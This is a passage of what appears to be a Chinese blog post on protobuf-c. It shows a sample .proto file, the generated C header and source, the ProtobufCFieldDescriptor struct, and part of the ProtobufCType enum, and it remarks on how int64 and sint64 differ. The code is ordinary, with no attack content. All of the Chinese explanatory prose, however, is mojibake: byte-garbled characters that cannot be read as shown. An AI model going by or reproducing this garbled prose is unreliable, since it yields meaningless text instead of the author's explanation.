Buffersï¼Œæ˜¯Googleå…¬å¸å¼€å‘çš„ä¸€ç§æ•°æ®æè¿°è¯­è¨€ï¼Œç±»ä¼¼äºXMLèƒ½å¤Ÿå°†ç»“æ„åŒ–æ•°æ®åºåˆ—åŒ–ï¼Œå¯ç”¨äºæ•°æ®å­˜å‚¨ã€é€šä¿¡åè®®ç­‰æ–¹é¢ã€‚å®ƒä¸ä¾èµ–äºè¯­è¨€å’Œå¹³å°å¹¶ä¸”å¯æ‰©å±•æ€§æå¼ºã€‚</p><p>åŒXMLç›¸æ¯”ï¼ŒProtocol buffersåœ¨åºåˆ—åŒ–ç»“æ„åŒ–æ•°æ®æ–¹é¢æœ‰è®¸å¤šä¼˜ç‚¹ï¼š</p><ol><li>  æ›´ç®€å•</li><li>  æ•°æ®æè¿°æ–‡ä»¶åªéœ€åŸæ¥çš„1/10è‡³1/3</li><li>  è§£æé€Ÿåº¦æ˜¯åŸæ¥çš„20å€è‡³100å€</li><li>  å‡å°‘äº†äºŒä¹‰æ€§</li><li>  ç”Ÿæˆäº†æ›´å®¹æ˜“åœ¨ç¼–ç¨‹ä¸­ä½¿ç”¨çš„æ•°æ®è®¿é—®</li><li>æ”¯æŒå¤šç§ç¼–ç¨‹è¯­è¨€<br>   ï¼ˆè½¬è‡ªç™¾åº¦ç™¾ç§‘ï¼‰</li></ol><p>è¿™é‡Œå°±ä¸å¤šæäº†ï¼Œå®‰è£…çš„è¯è‡ªå·±æœä¸€ä¸‹å°±æœ‰çš„ã€‚</p><h3 id="ä½¿ç”¨protobuf"><a href="#ä½¿ç”¨protobuf" class="headerlink" title="ä½¿ç”¨protobuf"></a>ä½¿ç”¨protobuf</h3><p>é¦–å…ˆç¼–å†™ä¸€ä¸ªæµ‹è¯•æ–‡ä»¶<code>test.proto</code></p><figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">syntax = <span class="string">&quot;proto2&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">message</span> <span class="title">test</span></span>&#123;</span><br><span class="line"><span class="keyword">required</span> <span class="built_in">int64</span> aaa = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">required</span> <span class="built_in">uint64</span> bbb = <span class="number">2</span>;</span><br><span class="line"><span class="keyword">required</span> <span class="built_in">sint64</span> ccc = <span class="number">3</span>;</span><br><span class="line"><span class="keyword">required</span> <span class="built_in">bytes</span> ddd = <span class="number">4</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨<code>protoc --c_out=. ./test.proto</code>å‘½ä»¤ç”Ÿæˆå¯¹åº”ä»£ç </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Generated by the protocol buffer compiler.  DO NOT EDIT! */</span></span><br><span class="line"><span class="comment">/* Generated from: test.proto */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> PROTOBUF_C_test_2eproto__INCLUDED</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PROTOBUF_C_test_2eproto__INCLUDED</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;protobuf-c/protobuf-c.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">PROTOBUF_C__BEGIN_DECLS</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> PROTOBUF_C_VERSION_NUMBER &lt; 1000000</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">error</span> This file was generated by a newer version of protoc-c which is incompatible with your libprotobuf-c headers. Please update your headers.</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">elif</span> 1003003 &lt; PROTOBUF_C_MIN_COMPILER_VERSION</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">error</span> This file was generated by an older version of protoc-c which is incompatible with your libprotobuf-c headers. Please regenerate this file with a newer version of protoc-c.</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">Test</span> <span class="title">Test</span>;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* --- enums --- */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* --- messages --- */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span>  _<span class="title">Test</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  ProtobufCMessage base;</span><br><span class="line">  <span class="keyword">int64_t</span> aaa;</span><br><span class="line">  <span class="keyword">uint64_t</span> bbb;</span><br><span class="line">  <span class="keyword">int64_t</span> ccc;</span><br><span class="line">  ProtobufCBinaryData ddd;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TEST__INIT \</span></span><br><span class="line"><span class="meta"> &#123; PROTOBUF_C_MESSAGE_INIT (&amp;test__descriptor) \</span></span><br><span class="line"><span class="meta">    , 0, 0, 0, &#123;0,NULL&#125; &#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Test methods */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span>   <span class="title">test__init</span></span></span><br><span class="line"><span class="function">                     <span class="params">(Test         *message)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">test__get_packed_size</span></span></span><br><span class="line"><span class="function">                     <span class="params">(<span class="keyword">const</span> Test   *message)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">test__pack</span></span></span><br><span class="line"><span class="function">                     <span class="params">(<span class="keyword">const</span> Test   *message,</span></span></span><br><span class="line"><span class="params"><span class="function">                      <span class="keyword">uint8_t</span>             *out)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">test__pack_to_buffer</span></span></span><br><span class="line"><span class="function">                     <span class="params">(<span class="keyword">const</span> Test   *message,</span></span></span><br><span class="line"><span class="params"><span class="function">                      ProtobufCBuffer     *buffer)</span></span>;</span><br><span class="line"><span class="function">Test *</span></span><br><span class="line"><span class="function">       <span class="title">test__unpack</span></span></span><br><span class="line"><span class="function">                     <span class="params">(ProtobufCAllocator  *allocator,</span></span></span><br><span class="line"><span class="params"><span class="function">                      <span class="keyword">size_t</span>               len,</span></span></span><br><span class="line"><span class="params"><span class="function">                      <span class="keyword">const</span> <span class="keyword">uint8_t</span>       *data)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span>   <span class="title">test__free_unpacked</span></span></span><br><span class="line"><span class="function">                     <span class="params">(Test *message,</span></span></span><br><span class="line"><span class="params"><span class="function">                      ProtobufCAllocator *allocator)</span></span>;</span><br><span class="line"><span class="comment">/* --- per-message closures --- */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span> <span class="params">(*Test_Closure)</span></span></span><br><span class="line"><span class="function">                 <span class="params">(<span class="keyword">const</span> Test *message,</span></span></span><br><span class="line"><span class="params"><span class="function">                  <span class="keyword">void</span> *closure_data)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* --- services --- */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* --- descriptors --- */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">const</span> ProtobufCMessageDescriptor test__descriptor;</span><br><span class="line"></span><br><span class="line">PROTOBUF_C__END_DECLS</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span>  <span class="comment">/* PROTOBUF_C_test_2eproto__INCLUDED */</span></span></span><br></pre></td></tr></table></figure><p>è¿™æ˜¯<code>test.pb-c.h</code>æ–‡ä»¶ï¼Œå¯ä»¥çœ‹åˆ°å…¶ä¸­å®šä¹‰äº†è®¸å¤šçš„å‡½æ•°ï¼Œå¹¶ä¸”å®šä¹‰äº†ç»“æ„ä½“ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Generated by the protocol buffer compiler.  DO NOT EDIT! */</span></span><br><span class="line"><span class="comment">/* Generated from: test.proto */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Do not generate deprecated warnings for self */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> PROTOBUF_C__NO_DEPRECATED</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PROTOBUF_C__NO_DEPRECATED</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;test.pb-c.h&quot;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span>   <span class="title">test__init</span></span></span><br><span class="line"><span class="function">                     <span class="params">(Test         *message)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">static</span> <span class="keyword">const</span> Test init_value = TEST__INIT;</span><br><span class="line">  *message = init_value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">test__get_packed_size</span></span></span><br><span class="line"><span class="function">                     <span class="params">(<span class="keyword">const</span> Test *message)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  assert(message-&gt;base.descriptor == &amp;test__descriptor);</span><br><span class="line">  <span class="keyword">return</span> protobuf_c_message_get_packed_size ((<span class="keyword">const</span> ProtobufCMessage*)(message));</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">test__pack</span></span></span><br><span class="line"><span class="function">                     <span class="params">(<span class="keyword">const</span> Test *message,</span></span></span><br><span class="line"><span class="params"><span class="function">                      <span class="keyword">uint8_t</span>       *out)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  assert(message-&gt;base.descriptor == &amp;test__descriptor);</span><br><span class="line">  <span class="keyword">return</span> protobuf_c_message_pack ((<span class="keyword">const</span> ProtobufCMessage*)message, out);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">test__pack_to_buffer</span></span></span><br><span class="line"><span class="function">                     <span class="params">(<span class="keyword">const</span> Test *message,</span></span></span><br><span class="line"><span class="params"><span class="function">                      ProtobufCBuffer *buffer)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  assert(message-&gt;base.descriptor == &amp;test__descriptor);</span><br><span class="line">  <span class="keyword">return</span> protobuf_c_message_pack_to_buffer ((<span class="keyword">const</span> ProtobufCMessage*)message, buffer);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">Test *</span></span><br><span class="line"><span class="function">       <span class="title">test__unpack</span></span></span><br><span class="line"><span class="function">                     <span class="params">(ProtobufCAllocator  *allocator,</span></span></span><br><span class="line"><span class="params"><span class="function">                      <span class="keyword">size_t</span>               len,</span></span></span><br><span class="line"><span class="params"><span class="function">                      <span class="keyword">const</span> <span class="keyword">uint8_t</span>       *data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (Test *)</span><br><span class="line">     protobuf_c_message_unpack (&amp;test__descriptor,</span><br><span class="line">                                allocator, len, data);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span>   <span class="title">test__free_unpacked</span></span></span><br><span class="line"><span class="function">                     <span class="params">(Test *message,</span></span></span><br><span class="line"><span class="params"><span class="function">                      ProtobufCAllocator *allocator)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(!message)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  assert(message-&gt;base.descriptor == &amp;test__descriptor);</span><br><span class="line">  protobuf_c_message_free_unpacked ((ProtobufCMessage*)message, allocator);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> ProtobufCFieldDescriptor test__field_descriptors[<span class="number">4</span>] =</span><br><span class="line">&#123;</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;aaa&quot;</span>,</span><br><span class="line">    <span class="number">1</span>,</span><br><span class="line">    PROTOBUF_C_LABEL_REQUIRED,</span><br><span class="line">    PROTOBUF_C_TYPE_INT64,</span><br><span class="line">    <span class="number">0</span>,   <span class="comment">/* quantifier_offset */</span></span><br><span class="line">    offsetof(Test, aaa),</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    <span class="number">0</span>,             <span class="comment">/* flags */</span></span><br><span class="line">    <span class="number">0</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>    <span class="comment">/* reserved1,reserved2, etc */</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;bbb&quot;</span>,</span><br><span class="line">    <span class="number">2</span>,</span><br><span class="line">    PROTOBUF_C_LABEL_REQUIRED,</span><br><span class="line">    PROTOBUF_C_TYPE_UINT64,</span><br><span class="line">    <span class="number">0</span>,   <span class="comment">/* quantifier_offset */</span></span><br><span class="line">    offsetof(Test, bbb),</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    <span class="number">0</span>,             <span class="comment">/* flags */</span></span><br><span class="line">    <span class="number">0</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>    <span class="comment">/* reserved1,reserved2, etc */</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;ccc&quot;</span>,</span><br><span class="line">    <span class="number">3</span>,</span><br><span class="line">    PROTOBUF_C_LABEL_REQUIRED,</span><br><span class="line">    PROTOBUF_C_TYPE_SINT64,</span><br><span class="line">    <span class="number">0</span>,   <span class="comment">/* quantifier_offset */</span></span><br><span class="line">    offsetof(Test, ccc),</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    <span class="number">0</span>,             <span class="comment">/* flags */</span></span><br><span class="line">    <span class="number">0</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>    <span class="comment">/* reserved1,reserved2, etc */</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;ddd&quot;</span>,</span><br><span class="line">    <span class="number">4</span>,</span><br><span class="line">    PROTOBUF_C_LABEL_REQUIRED,</span><br><span class="line">    PROTOBUF_C_TYPE_BYTES,</span><br><span class="line">    <span class="number">0</span>,   <span class="comment">/* quantifier_offset */</span></span><br><span class="line">    offsetof(Test, ddd),</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    <span class="number">0</span>,             <span class="comment">/* flags */</span></span><br><span class="line">    <span class="number">0</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>    <span class="comment">/* reserved1,reserved2, etc */</span></span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">unsigned</span> test__field_indices_by_name[] = &#123;</span><br><span class="line">  <span class="number">0</span>,   <span class="comment">/* field[0] = aaa */</span></span><br><span class="line">  <span class="number">1</span>,   <span class="comment">/* field[1] = bbb */</span></span><br><span class="line">  <span class="number">2</span>,   <span class="comment">/* field[2] = ccc */</span></span><br><span class="line">  <span class="number">3</span>,   <span class="comment">/* field[3] = ddd */</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> ProtobufCIntRange test__number_ranges[<span class="number">1</span> + <span class="number">1</span>] =</span><br><span class="line">&#123;</span><br><span class="line">  &#123; <span class="number">1</span>, <span class="number">0</span> &#125;,</span><br><span class="line">  &#123; <span class="number">0</span>, <span class="number">4</span> &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">const</span> ProtobufCMessageDescriptor test__descriptor =</span><br><span class="line">&#123;</span><br><span class="line">  PROTOBUF_C__MESSAGE_DESCRIPTOR_MAGIC,</span><br><span class="line">  <span class="string">&quot;test&quot;</span>,</span><br><span class="line">  <span class="string">&quot;Test&quot;</span>,</span><br><span class="line">  <span class="string">&quot;Test&quot;</span>,</span><br><span class="line">  <span class="string">&quot;&quot;</span>,</span><br><span class="line">  <span class="keyword">sizeof</span>(Test),</span><br><span class="line">  <span class="number">4</span>,</span><br><span class="line">  test__field_descriptors,</span><br><span class="line">  test__field_indices_by_name,</span><br><span class="line">  <span class="number">1</span>,  test__number_ranges,</span><br><span class="line">  (ProtobufCMessageInit) test__init,</span><br><span class="line">  <span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>    <span class="comment">/* reserved[123] */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæ–‡ä»¶å°±æ˜¯<code>test.pb-c.c</code>æ–‡ä»¶ï¼Œå†…éƒ¨å¯¹<code>test__field_descriptors</code>æ•°ç»„è¿›è¡Œäº†å¤åˆ¶ï¼Œè¿™é‡Œä½¿ç”¨çš„ç»“æ„ä½“ä¸º<code>ProtobufCFieldDescriptor</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ProtobufCFieldDescriptor</span> &#123;</span></span><br><span class="line"><span class="comment">/** Name of the field as given in the .proto file. */</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span>*name;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Tag value of the field as given in the .proto file. */</span></span><br><span class="line"><span class="keyword">uint32_t</span>id;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Whether the field is `REQUIRED`, `OPTIONAL`, or `REPEATED`. */</span></span><br><span class="line">ProtobufCLabellabel;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** The type of the field. */</span></span><br><span class="line">ProtobufCTypetype;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * The offset in bytes of the message&#x27;s C structure&#x27;s quantifier field</span></span><br><span class="line"><span class="comment"> * (the `has_MEMBER` field for optional members or the `n_MEMBER` field</span></span><br><span class="line"><span class="comment"> * for repeated members or the case enum for oneofs).</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">unsigned</span>quantifier_offset;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * The offset in bytes into the message&#x27;s C structure for the member</span></span><br><span class="line"><span class="comment"> * itself.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">unsigned</span>offset;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * A type-specific descriptor.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * If `type` is `PROTOBUF_C_TYPE_ENUM`, then `descriptor` points to the</span></span><br><span class="line"><span class="comment"> * corresponding `ProtobufCEnumDescriptor`.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * If `type` is `PROTOBUF_C_TYPE_MESSAGE`, then `descriptor` points to</span></span><br><span class="line"><span class="comment"> * the corresponding `ProtobufCMessageDescriptor`.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Otherwise this field is NULL.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">void</span>*descriptor; <span class="comment">/* for MESSAGE and ENUM types */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/** The default value for this field, if defined. May be NULL. */</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">void</span>*default_value;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * A flag word. Zero or more of the bits defined in the</span></span><br><span class="line"><span class="comment"> * `ProtobufCFieldFlag` enum may be set.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">uint32_t</span>flags;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Reserved for future use. */</span></span><br><span class="line"><span class="keyword">unsigned</span>reserved_flags;</span><br><span class="line"><span class="comment">/** Reserved for future use. */</span></span><br><span class="line"><span class="keyword">void</span>*reserved2;</span><br><span class="line"><span class="comment">/** Reserved for future use. */</span></span><br><span class="line"><span class="keyword">void</span>*reserved3;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>è€Œè¿™ä¸ªç»“æ„ä½“ä¸­çš„typeå°±æ˜¯æ•°æ®çš„ç±»å‹ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæˆ‘ä»¬åœ¨<code>proto</code>æ–‡ä»¶ä¸­ï¼Œåˆ†åˆ«å®šä¹‰äº†<code>int64</code>å’Œ<code>sint64</code>è™½ç„¶ç»“æ„ä½“ä¸­éƒ½è¢«ç¿»è¯‘æˆäº†<code>int64_t</code>ç±»å‹ï¼Œä½†æ˜¯å¯ä»¥åœ¨<code>test.pb-c.c</code>æ–‡ä»¶ä¸­çœ‹åˆ°ï¼Œä»–ä»¬åœ¨ä¸Šè¿°ç»“æ„ä½“ä¸­çš„typeå€¼æ˜¯ä¸ä¸€æ ·çš„ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span> &#123;</span></span><br><span class="line">PROTOBUF_C_TYPE_INT32,      <span class="comment">/**&lt; int32 */</span></span><br><span class="line">PROTOBUF_C_TYPE_SINT32,     <span class="comment">/**&lt; signed int32 */</span></span><br><span class="line">PROTOBUF_C_TYPE_SFIXED32,   <span class="comment">/**&lt; signed int32 (4 bytes) */</span></span><br><span class="line">PROTOBUF_C_TYPE_INT64,      <span class="comment">/**&lt; int64 */</span></span><br><span class="line">PROTOBUF_C_TYPE_SINT64,     <span class="comment">/**&lt; signed int64 */</span></span><br><span class="line">PROTOBUF_C_TYPE_SFIXED64,   <span class="comment">/**&lt; signed int64 (8 bytes) */</span></span><br><span class="line">PROTOBUF_C_TYPE_UINT32,     <span class="comment">/**&lt; unsigned int32 */</span></span><br><span class="line">PROTOBUF_C_TYPE_FIXED32,    <span class="comment">/**&lt; unsigned int32 (4 bytes) */</span></span><br><span class="line">PROTOBUF_C_TYPE_UINT64,     <span class="comment">/**&lt; unsigned int64 */</span></span><br><span class="line">PROTOBUF_C_TYPE_FIXED64,    <span class="comment">/**&lt; unsigned int64 (8 bytes) */</span></span><br><span class="line">PROTOBUF_C_TYPE_FLOAT,      <span class="comment">/**&lt; float */</span></span><br><span class="line">PROTOBUF_C_TYPE_DOUBLE,     <span class="comment">/**&lt; double */</span></span><br><span class="line">PROTOBUF_C_TYPE_BOOL,       <span class="comment">/**&lt; boolean */</span></span><br><span class="line">PROTOBUF_C_TYPE_ENUM,       <span class="comment">/**&lt; enumerated type */</span></span><br><span class="line">PROTOBUF_C_TYPE_STRING,     <span class="comment">/**&lt; UTF-8 or ASCII string */</span></span><br><span class="line">PROTOBUF_C_TYPE_BYTES,      <span class="comment">/**&lt; arbitrary byte sequence */</span></span><br><span class="line">PROTOBUF_C_TYPE_MESSAGE,    <span class="comment">/**&lt; nested 